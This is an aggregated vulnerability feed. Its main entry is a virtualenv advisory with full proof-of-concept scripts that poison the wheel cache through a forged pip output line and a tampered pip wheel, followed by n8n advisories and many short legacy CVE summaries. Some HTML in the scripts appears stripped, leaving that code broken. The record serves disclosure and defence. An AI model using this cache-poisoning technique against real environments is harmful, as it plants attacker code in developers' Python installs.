source: CIRCL CVE Search + GitHub Advisory OSV + CISA KEV + NIST NVD

cves.summary: ## Summary Wheel downloads go directly into the reusable wheelhouse, while the verification target is selected from pip's textual output. A verification failure does not remove the downloaded file from that cache. Anthropic's OSS Scanner reported this as `ANT-2026-ST00DRO3` in `virtualenv-20261015-005`, received on 15 October 2026. ## Affected area Download selection and promotion into the reusable wheel cache. ## Attacker-controlled input A download must fail verification, or the archive selected from pip output must differ from the file later reused. Default-index digest verification must be enabled. Existing custom-index exceptions are outside the promised PyPI comparison. ## Affected code The relevant 21.14.8 source is in [wheel download and digest check](https://github.com/pypa/virtualenv/blob/a795ab116356afde11039cf2763d77e8a06da738/src/virtualenv/seed/wheels/acquire.py). ## Mechanism `download_wheel()` tells pip to write directly into the reusable `wheel/house` cache. It then selects a path to hash from the first `Saved ` line in pip's stdout, rather than from the file pip actually placed there. A package index can inject such a line through a discarded link's `data-requires-python` attribute. A separate failure exists without the forged line: a digest mismatch raises after the downloaded wheel has entered the cache, and the rejected bytes remain there. Later wheel selection does not hash the cached file again. ## Reproduction and evidence The scanner used a local index configured in `pip.conf`, with PyPI digest comparison still enabled. In the control case it served a modified pip wheel alone. `virtualenv --upgrade-embed-wheels` refused the mismatch, and a subsequent environment used the bundled pip. In the attack case the index added a link whose `data-requires-python` contained a forged `Saved ` line pointing at a genuine bundled wheel. The upgrade then exited without a digest error, recorded the modified wheel in its update log, and a later environment's `pip --version` ran a line added by the index. The reproduction used a known absolute path to the genuine bundled wheel; that prerequisite is part of this variant. The report also shows that a refused wheel can replace a previously accepted file of the same name in `wheel/house`, leaving rejected bytes available for later use. It does not claim to bypass TLS or affect the default PyPI setup. The gap follows the digest check added in #3251, first released in 21.7.12. [PR #3430](https://github.com/pypa/virtualenv/pull/3430) downloads to a private temporary directory, verifies the actual archive, and promotes it only after acceptance. ## Attack sequence ```mermaid sequenceDiagram participant I as Configured index participant P as pip download participant C as wheel/house cache participant V as virtualenv digest check participant N as New environment I->>P: modified wheel and forged Saved line P->>C: write modified wheel directly P-->>V: stdout names genuine bundled wheel V->>V: hash genuine wheel and accept V->>C: record modified wheel for reuse C->>N: seed modified pip without rehash Note over P,C: Even a rejected wheel can remain in the cache ``` ## Reproducer files The following files are from the scanner report for `ANT-2026-ST00DRO3`. They were tested against commit `a857a7823c73` in the scanner image. The `repro` entrypoint expects companion files under `/tmp/repro.d`; cases that change user IDs need a disposable root-capable container. The last output line is `BUG` when the reported behavior occurs. These files are included as evidence and were not rerun for this advisory update. **`repro`** ```text #!/usr/bin/env python3 import atexit import hashlib import json import os import shutil import subprocess import sys from pathlib import Path companions = Path("/tmp/repro.d") work = Path("/tmp/forged-saved-line") home = work / "home" app_data = home / ".cache" / "virtualenv" this_python = f"{sys.version_info.major}.{sys.version_info.minor}" # the target; each Python has its own update log update_log_of_pip = app_data / "wheel" / this_python / "embed" / "3" / "pip.json" virtualenv = [sys.executable, companions / "virtualenv_with_local_pypi_json.py", work / "pypi"] as_user = {"cwd": home, "env": {"HOME": str(home), "PATH": os.environ["PATH"]}, "capture_output": True, "text": True} added_code_prints = "code added by the index" # the line index_serves_modified_pip.py adds to pip/__init__.py def user_upgrades_seed_wheels_and_creates_env(): # each case starts from an empty app-data shutil.rmtree(app_data, ignore_errors=True) shutil.rmtree(home / "env", ignore_errors=True) upgrade = subprocess.run([*virtualenv, "--upgrade-embed-wheels"], **as_user) # --no-periodic-update: the background update is another process, which the PyPI stand-in does not reach subprocess.run([*virtualenv, "--no-periodic-update", "env"], **as_user, check=True) pip_version = subprocess.run([home / "env" / "bin" / "python", "-m", "pip", "--version"], **as_user, check=True) # one thread per target Python; a refused wheel ends its thread with a traceback on stderr, the exit code stays 0 refusal = next((line for line in upgrade.stderr.splitlines() if "but PyPI reports" in line), None) logged = [] if update_log_of_pip.exists(): # a failed update writes no log logged = [entry["filename"] for entry in json.loads(update_log_of_pip.read_text())["versions"]] return refusal, logged, pip_version.stdout.splitlines() # set up: PyPI's answers, a faithful mirror of PyPI on 127.0.0.1:8099, a user whose pip.conf points pip at it shutil.rmtree(work, ignore_errors=True) (home / ".config" / "pip").mkdir(parents=True) shutil.copy(companions / "pip.conf", home / ".config" / "pip" / "pip.conf") subprocess.run([sys.executable, companions / "pypi_json_and_mirror.py", work / "pypi", work / "index"], check=True) index_server = subprocess.Popen( [sys.executable, "-u", "-m", "http.server", "8099", "--bind", "127.0.0.1", "--directory", work / "index"], stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True, ) atexit.register(index_server.kill) assert index_server.stdout.readline().startswith("Serving HTTP"), "index server did not start" # printed once bound # control: the index serves a modified pip 26.0.1, and virtualenv's comparison with PyPI's SHA-256 refuses it subprocess.run([sys.executable, companions / "index_serves_modified_pip.py", work / "index"], check=True) refusal, logged, pip_says = user_upgrades_seed_wheels_and_creates_env() print("CONTROL modified pip: --upgrade-embed-wheels refused with:", refusal) print("CONTROL modified pip: update log of pip lists", logged) print("CONTROL modified pip: pip --version in the new env prints", pip_says) control_ran_added_code = added_code_prints in "\n".join(pip_says) # attack: the index also adds one link, whose data-requires-python puts a "Saved " line into pip's output subprocess.run([sys.executable, companions / "index_forges_saved_line.py", work / "index"], check=True) refusal, logged, pip_says = user_upgrades_seed_wheels_and_creates_env() stored_wheel = app_data / "wheel" / "house" / "pip-26.0.1-py3-none-any.whl" stored_sha256 = hashlib.sha256(stored_wheel.read_bytes()).hexdigest() pypi_sha256 = json.loads((work / "pypi" / "pip.json").read_text())["releases"]["26.0.1"][0]["digests"]["sha256"] print("OBSERVED + forged line: --upgrade-embed-wheels refused with:", refusal) print("OBSERVED + forged line: update log of pip lists", logged) print("OBSERVED + forged line: sha256 of that wheel in wheel/house:", stored_sha256) print("OBSERVED + forged line: sha256 PyPI publishes for that name:", pypi_sha256) print("OBSERVED + forged line: pip --version in the new env prints", pip_says) attack_ran_added_code = added_code_prints in "\n".join(pip_says) # check: the same modified wheel, refused without the forged line, is seeded with it print("BUG" if attack_ran_added_code and not control_ran_added_code else "OK") ``` **`repro.d/index_forges_saved_line.py`** ```text """Attacker, as the operator of the index the user's pip.conf names: make pip print a "Saved " line of its choice. usage: index_forges_saved_line.py Adds one link to the page of pip; the file behind it is a renamed copy of the genuine pip 26.2.1. """ import shutil import sys from pathlib import Path # a genuine PyPI file named pip-26.0.1-py3-none-any.whl on the user's disk: the wheel virtualenv bundles for Python 3.9, # at the same path for every user of this image GENUINE_WHEEL_ON_USERS_DISK = "/src/src/virtualenv/seed/wheels/embed/pip-26.0.1-py3-none-any.whl" index_dir = Path(sys.argv[1]) # named 100.0 while its METADATA says 26.2.1: pip tries it first, then drops it with # "Discarding (requires-python:): ... has inconsistent version" on stdout shutil.copy(index_dir / "files" / "pip-26.2.1-py3-none-any.whl", index_dir / "files" / "pip-100.0-py3-none-any.whl") # pip keeps a link whose data-requires-python it cannot parse, and prints the attribute as written; is a line feed with (index_dir / "simple" / "pip" / "index.html").open("a") as page: page.write( 'pip-100.0-py3-none-any.whl\n' ) ``` **`repro.d/index_serves_modified_pip.py`** ```text """Attacker, as the operator of the index the user's pip.conf names: serve a modified pip under a genuine name. usage: index_serves_modified_pip.py pip 26.0.1 on the index gets one more line of code in pip/__init__.py and becomes the only pip on offer. On its own, virtualenv's comparison with PyPI's SHA-256 catches this. """ import hashlib import io import sys import zipfile from pathlib import Path ADDED_CODE = b'\nprint("code added by the index runs as uid", __import__("os").getuid())\n' index_dir = Path(sys.argv[1]) wheel = index_dir / "files" / "pip-26.0.1-py3-none-any.whl" genuine = zipfile.ZipFile(io.BytesIO(wheel.read_bytes())) with zipfile.ZipFile(wheel, "w") as modified: for entry in genuine.infolist(): content = genuine.read(entry) if entry.filename == "pip/__init__.py": content += ADDED_CODE modified.writestr(entry, content) # the #sha256= that every PyPI link carries matters: --upgrade-embed-wheels copies the bundled pip 26.0.1 into pip's # download folder first, and pip replaces a file of the same name there only when the link's digest differs sha256 = hashlib.sha256(wheel.read_bytes()).hexdigest() (index_dir / "simple" / "pip" / "index.html").write_text( f'\n{wheel.name}\n' ) ``` **`repro.d/pip.conf`** ```text [global] index-url = http://127.0.0.1:8099/simple ``` **`repro.d/pypi_json_and_mirror.py`** ```text """Setup: what PyPI's JSON API answers for the seed wheels, and an index that mirrors PyPI faithfully. usage: pypi_json_and_mirror.py The wheels bundled with virtualenv are genuine PyPI files. /.json is what https://pypi.org/pypi//json answers for them, with the digests of virtualenv's BUNDLE_SHA256 table. is a PEP 503 tree (simple//index.html, files/) that offers exactly these files. """ import json import shutil import sys import zipfile from email.parser import HeaderParser from html import escape from pathlib import Path from virtualenv.seed.wheels.embed import BUNDLE_FOLDER, BUNDLE_SHA256 pypi_dir, index_dir = Path(sys.argv[1]), Path(sys.argv[2]) pypi_dir.mkdir() (index_dir / "files").mkdir(parents=True) for project in ("pip", "setuptools"): releases, links = {}, [] for filename, sha256 in BUNDLE_SHA256.items(): name, version = filename.split("-")[:2] if name != project: continue shutil.copy(BUNDLE_FOLDER / filename, index_dir / "files") releases[version] = [{"filename": filename, "digests": {"sha256": sha256}, "upload_time": "2026-01-01T00:00:00"}] with zipfile.ZipFile(BUNDLE_FOLDER / filename) as wheel: metadata = HeaderParser().parsestr(wheel.read(f"{name}-{version}.dist-info/METADATA").decode()) requires_python = escape(metadata["Requires-Python"]) links.append(f'{filename}') (pypi_dir / f"{project}.json").write_text(json.dumps({"releases": releases})) (index_dir / "simple" / project).mkdir(parents=True) (index_dir / "simple" / project / "index.html").write_text("\n" + "\n".join(links) + "\n") ``` **`repro.d/virtualenv_with_local_pypi_json.py`** ```text """Setup: the virtualenv command line, with PyPI's JSON API answered from local files because there is no network. usage: virtualenv_with_local_pypi_json.py Only the request for https://pypi.org/pypi//json is replaced: it is answered from /.json. pip, the index pip talks to and the rest of virtualenv are the real thing. """ import sys from pathlib import Path from unittest import mock from virtualenv.__main__ import run_with_catch pypi_dir = Path(sys.argv[1]) def pypi_json_api(url, context): assert url.startswith("https://pypi.org/pypi/") and context is None, url project = url.split("/")[4] return (pypi_dir / f"{project}.json").open("rb") with mock.patch("virtualenv.seed.wheels.periodic_update.urlopen", pypi_json_api): run_with_catch(sys.argv[2:]) ``` ## Impact A file rejected during download verification can remain available for later cache selection. Exploitation requires additional control over the downloaded data or archive selection; this finding alone does not bypass TLS. Severity: low. ## Versions tested The confirmed release is 21.14.8. The affected range records that release only; it does not establish the first affected version or exclude earlier releases. Fixed in 21.14.9. The fix downloads into a private temporary directory and verifies archive identity, requested version, digest where applicable, and Python compatibility before promoting a wheel into the reusable cache. Fix: [PR #3430](https://github.com/pypa/virtualenv/pull/3430). ## Known mitigation After a failed verification, discard that download cache before reusing it. Use embedded wheels while reviewing unexpected download failures. ## Affected release - [x] The problem reproduces on virtualenv 21.14.8. ## Credits Reported by Anthropic's OSS Scanner as ANT-2026-ST00DRO3.

cwe.name: Improper Validation of Integrity Check Value

cves.summary: The installation for Windows 2000 does not activate the Administrator password until the system has rebooted, which allows remote attackers to connect to the ADMIN$ share without a password until the reboot occurs.

Qualcomm Eudora 5.1 allows remote attackers to execute arbitrary code via an HTML e-mail message that uses a file:// URL in a t:video tag to reference an attached Windows Media Player file containing JavaScript code, which is launched and executed in the My Computer zone by Internet Explorer.

Matt Wright FormMail 1.9 and earlier allows remote attackers to send spam or anonymous e-mail by injecting a newline character followed by CC:, BCC:, or additional TO: fields in the email and realname CGI variables.

Novell Netware 5.0 through 5.1 may allow local users to gain "Domain Admin" rights by logging into a Novell Directory Services (NDS) account, and executing "net use" on an NDS_ADM account that is not in the NT domain but has domain access rights, which allows the user to enter a null password.

## Impact

The Instance AI workflow summary built its result with get-or-create-then-nested-write idioms keyed by node names and connection keys taken from the stored workflow. Those are arbitrary strings: the restricted-name guard n8n shows in the editor is client-side and is bypassed by posting the workflow to the REST API directly. So a reserved key such as `__proto__` resolved up the prototype chain instead of creating an own key, and the write landed on `Object.prototype` in the main n8n process, affecting every later request. The patch builds the summary with null-prototype accumulators and validates the keys it accepts, so reserved names cannot reach the prototype chain.

## Patches

The issue has been fixed in n8n versions 2.37.7 and 2.38.2. Users should upgrade to one of these versions or later to remediate the vulnerability.

## Workarounds

If upgrading is not immediately possible, administrators should consider the following temporary mitigations:
- Restrict n8n instance access to fully trusted users only.
- Remove or leave unconfigured the `N8N_INSTANCE_AI_MODEL*` environment variables to prevent the Instance AI module from reaching the vulnerable code path.
- Restart the n8n process to clear any in-memory prototype pollution if an attack is suspected.

These workarounds do not fully remediate the risk and should only be used as short-term mitigation measures.

cwe.name: Improperly Controlled Modification of Object Prototype Attributes ('Prototype Pollution')

cves.summary:
## Impact

The endpoint `/rest/active-workflows` returned every active workflow ID on the instance to any member, regardless of sharing, and workflow activation, deactivation and publication push events were broadcast to every connected client, carrying workflow IDs, version IDs and activation-error detail across users. The patch scopes both the listing and the push events through the sharing service, so a user only sees workflows they can access.

## Patches

The issue has been fixed in n8n versions 1.123.76, 2.37.7, and 2.38.2. Users should upgrade to one of these versions or later to remediate the vulnerability.

## Workarounds

If upgrading is not immediately possible, administrators should consider the following temporary mitigations:
- Restrict n8n instance access to fully trusted users only.
- Avoid provisioning `global:member` accounts for untrusted users until the instance is patched.

These workarounds do not fully remediate the risk and should only be used as short-term mitigation measures.

## Impact

Two stages of expression code generation built source text by calling the global `JSON.stringify` at generation time: the compiler when printing synthetic string literals, and the isolate bridge when interpolating a timezone value into its per-evaluation wrapper. An expression that replaced that global therefore changed the code that was subsequently generated and executed, turning literal data into executable source. The patch renders both code-generation stages through a reference captured at module load, so a later change to global state cannot alter the generated source.

This vulnerability only affects instances running the legacy expression engine. The `vm` expression engine, which is the default on the patched releases, is not affected.

## Patches

The issue has been fixed in n8n versions 1.123.76, 2.37.7, and 2.38.2. Users should upgrade to one of these versions or later to remediate the vulnerability.

## Workarounds

If upgrading is not immediately possible, administrators should consider the following temporary mitigations:
- Set the environment variable `N8N_EXPRESSION_ENGINE=vm` to switch to the vm expression engine, which is not affected by this vulnerability.
- Restrict n8n instance access to fully trusted users only.
- Ensure the n8n process runs under a dedicated low-privilege OS user account to limit the impact of any command execution.

These workarounds do not fully remediate the risk and should only be used as short-term mitigation measures.

cwe.name: Improper Control of Generation of Code ('Code Injection')

cves.summary: Multiple content security gateway and antivirus products allow remote attackers to bypass content restrictions via MIME messages that use non-standard separator characters, or use standard separators incorrectly, within MIME headers, fields, parameters, or values, which may be interpreted differently by mail clients.
Ceilidh allows remote attackers to cause a denial of service via a large number of POST requests.

readline prior to 4.1, in OpenBSD 2.8 and earlier, creates history files with insecure permissions, which allows a local attacker to recover potentially sensitive information via readline history files.

The OpenPGP PGP standard allows an attacker to determine the private signature key via a cryptanalytic attack in which the attacker alters the encrypted private key file and captures a single message signed with the signature key.
time server daemon timed allows remote attackers to cause a denial of service via malformed packets.
Directory traversal vulnerability in Oracle JSP 1.0.x through 1.1.1 and Oracle 8.1.7 iAS Release 1.0.2 can allow a remote attacker to read or execute arbitrary .jsp files via a '..' (dot dot) attack.
SSH 1.2.25 on HP-UX allows access to new user accounts.
Buffer overflow in web administration feature of Kolban Webcam32 4.8.3 and earlier allows remote attackers to execute arbitrary commands via a long URL.

The installation of Novell Netware NDS 5.99 provides an unauthenticated client with Read access for the tree, which allows remote attackers to access sensitive information such as users, groups, and readable objects via CX.EXE and NLIST.EXE.
Dark Age of Camelot before 1.68 live patch does not sign the RSA public key, which could allow remote malicious servers to gain sensitive information via a man-in-the-middle attack.
Ipswitch WS_FTP Server 4.0.2 has a backdoor XXSESS_MGRYY username with a default password, which allows remote attackers to gain access.

Rejected reason: DO NOT USE THIS CANDIDATE NUMBER.  ConsultIDs: CVE-2004-1848.  Reason: This candidate is a duplicate of CVE-2004-1848.  Notes: All CVE users should reference CVE-2004-1848 instead of this candidate.  All references and descriptions in this candidate have been removed to prevent accidental usage

Multiple cross-site scripting (XSS) vulnerabilities in cPanel 9.1.0 allow remote attackers to inject arbitrary web script or HTML via the (1) email parameter to dodelautores.html or (2) handle parameter to addhandle.html.
Dameware Mini Remote Control 4.1.0.0 uses insufficiently random data to create the encryption key, which makes it easier for remote attackers to obtain sensitive information via brute force guessing.
Buffer overflow in the logging function in Picophone 1.63 and earlier allows remote attackers to execute arbitrary code via a large packet.
devices_update_printer_fw_upload.hts in HP Web JetAdmin 7.5.2546, when no password is set, allows remote attackers to upload arbitrary files to the printer directory.

The registry key containing the SQL Server service account information in Microsoft SQL Server 2000, including Microsoft SQL Server Desktop Engine (MSDE) 2000, has insecure permissions, which allows local users to gain privileges, aka "Incorrect Permission on SQL Server Service Account Registry Key."

The installation of Microsoft Data Engine 1.0 (MSDE 1.0), and Microsoft SQL Server 2000 creates setup.iss files with insecure permissions and does not delete them after installation, which allows local users to obtain sensitive data, including weakly encrypted passwords, to gain privileges, aka "SQL Server Installation Process May Leave Passwords on System."

Format string vulnerability in Pablo FTP Server 1.5, 1.3, and possibly other versions, allows remote attackers to cause a denial of service and possibly execute arbitrary code via format strings in the USER command.

Maped in LuxMan 0.41 uses the user-provided search path to find and execute the gzip program, which allows local users to modify /dev/mem and gain privileges via a modified PATH environment variable that points to a Trojan horse gzip program.
Northern Solutions Xeneo Web Server 2.1.0.0, 2.0.759.6, and other versions before 2.1.5 allows remote attackers to cause a denial of service (crash) via a GET request for a "%" URI.
Buffer overflow in Abuse 2.00 and earlier allows local users to gain root privileges via a long -net command line argument.
Buffer overflow in log2mail before 0.2.5.1 allows remote attackers to execute arbitrary code via a long log message.
A buffer overflow in InterScan VirusWall 3.23 and 3.3 allows a remote attacker to execute arbitrary code by sending a long HELO command to the server.
Buffer overflow in NFS server on Linux allows attackers to execute commands via a long pathname.
Whois Internic Lookup program whois.cgi allows remote attackers to execute commands via shell metacharacters in the domain entry.
Matt's Whois program whois.cgi allows remote attackers to execute commands via shell metacharacters in the domain entry.
CC Whois program whois.cgi allows remote attackers to execute commands via shell metacharacters in the domain entry.
fsr_efs in IRIX 6.5 allows local users to conduct unauthorized file activities via a symlink attack, possibly via the .fsrlast file.
mv in IRIX 6.5 creates a directory with world-writable permissions while moving a directory, which could allow local users to modify files and directories.

restore 0.4b15 and earlier in Red Hat Linux 6.2 trusts the pathname specified by the RSH environmental variable, which allows local users to obtain root privileges by modifying the RSH variable to point to a Trojan horse program.

Winamp 2.65 through 3.0 stores skin files in a predictable file location, which allows remote attackers to execute arbitrary code via a URL reference to (1) wsz and (2) wal files that contain embedded code.
Local or remote users can force ControlIT 4.5 to reboot or force a user to log out, resulting in a denial of service.
Remote attackers can cause a denial of service in Sendmail 8.8.x and 8.9.2 by sending messages with a large number of headers.
IIS 4.0 and Apache log HTTP request methods, regardless of how long they are, allowing a remote attacker to hide the URL they really request.

Microsoft Internet Explorer 5.01, 5.5 and 6.0 does not properly check parameters that are passed during third party rendering, which could allow remote attackers to execute arbitrary web script, aka the "Third Party Plugin Rendering" vulnerability, a different vulnerability than CVE-2003-0233.
Buffer overflow in the web administration service for the HiNet LP5100 IP-phone allows remote attackers to cause a denial of service and possibly execute arbitrary commands via a long GET request.
The NSAPI plugins for TGA and the Java Servlet proxy in HP-UX VVOS 10.24 and 11.04 allows an attacker to cause a denial of service (high CPU utilization).

Directory traversal vulnerability in WorldClient.cgi in WorldClient for Alt-N Technologies MDaemon 5.0.5.0 and earlier allows local users to delete arbitrary files via a ".." (dot dot) in the Attachments parameter.

SOAP::Lite 0.50 through 0.52 allows remote attackers to load arbitrary Perl functions by suppling a non-existent function in a script using a SOAP::Lite module, which causes the AUTOLOAD subroutine to trigger.
AOL ICQ 2002a Build 3722 allows remote attackers to cause a denial of service (crash) via a malformed .hpf file.
A router's configuration service or management interface (such as a web server or telnet) is configured to allow connections from arbitrary hosts.
